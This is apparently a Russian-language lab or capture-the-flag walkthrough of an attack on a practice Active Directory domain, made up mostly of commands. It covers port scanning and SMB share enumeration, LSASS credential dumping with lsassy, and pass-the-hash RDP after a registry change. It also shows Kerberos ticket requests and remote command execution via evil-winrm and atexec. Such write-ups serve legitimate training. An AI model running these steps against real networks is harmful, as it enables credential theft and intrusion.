

Просканируем все хосты для определения векторов атак 
```
 nmap -iL url.txt -p10050,10051,10250,10255,1099,111,135,139,143,1433,1434,1500,1521-1527,1540,1541,161,179,2001,2010,2049,21,2181,22,2222,23,2375,2376,2379,25,27017,27018,2809,3050,3200-3299,3306,3389,389,443,445,4678,4786,4848,4899,49152,50013,50070,53,5432,5433,5555,5557,5558,5559,5601,5666,5800-5810,5900,5901,5985,5986,623,636,6379,6443,7001,7873,80,8000,8001,8002,8004,8006,8007,8008,8080,8081,8111,8180,8200,8201,8291,8400,8443,8500,8501,873,88,8879,8888,9000,9043,9060,9080,9200,9300,9443,9501,9502,9503 --open -sVC
```
Исследуем доступные шары и пользователей с полученными кредами
```
nxc smb 10.168.68.3-10.168.68.6 -u "Bob" -p "b0b1sH@cker" --shares --users                     

```
Находим шару BobsFolder на DC. Подключаем и находим хеш пользователя SuperAdmin
```
smbclient //10.168.68.3/BobsFolder -U Bob                                                   

get mailToBob.txt
```
Проверим доступ и попытаемся выгрузить lsassy
```
nxc smb 10.168.68.3-10.168.68-6 -u "SuperAdmin" -H  "hash" -M lsassy
```
Получаем хеш пользователя Administrator
# SRV1
Проверяем доступ к srv1 через rdp
```
nxc rdp 10.168.68.4 -u "Administrator" -H  "hash"
```
При подключение к rdp с помощью команды ``` xfreerdp3 /v:10.168.68.4 /u:Administrator /pth:hash /d:corp.local``` получаем ошибку
Для исправления воспользуемся командой 
```
impacket-reg Administrator:''@10.168.68.4 -hashes :<hash> add -keyName HKLM\\System\\CurrentControlSet\\Control\\Lsa -v DisableRestrictedAdmin -vt REG_DWORD -vd 0
```
и зачем повторно подключимся по rdp и забираем флаг  с рабочего стола администратора
# SRV2

Настраиваем /etc/hosts
```
10.168.68.3 dc.corp.local
10.168.68.4 srv1.corp.local
10.168.68.5 srv2.corp.local
10.168.68.6 srv3.corp.local
```
Настраиваем /etc/krb5.conf
```
[libdefaults]
  default_realm = corp.local
[realms]
  CORP.LOCAL = {
    kdc = 10.168.68.3
  }
```

Синхронизируем время с dc
```
sudo rdate -n 10.168.68.3
```
Получаем тикет
```
impacket-getTGT corp.local/SuperAdmin -hashes :<hash> -dc-ip 10.168.68.3
```
Подключаемся через evil-winrm с использованием тикета и забираем флаг
```
KRB5CCNAME=./SuperAdmin.ccache evil-winrm -i srv2.corp.local -u SuperAdmin  -r corp.local
```

# SRV3
Проверим создание задачи с помощью службы планировщика
```
impacket-atexec -hashes :<hash> corp.local/SuperAdmin@10.168.68.6 systeminfo
```
Перейдем в директорию и прочитаем флаг
```
impacket-atexec -hashes :<hash> corp.local/SuperAdmin@10.168.68.6 'cd C:\Users\Administrator\Desktop && type flag.txt'
```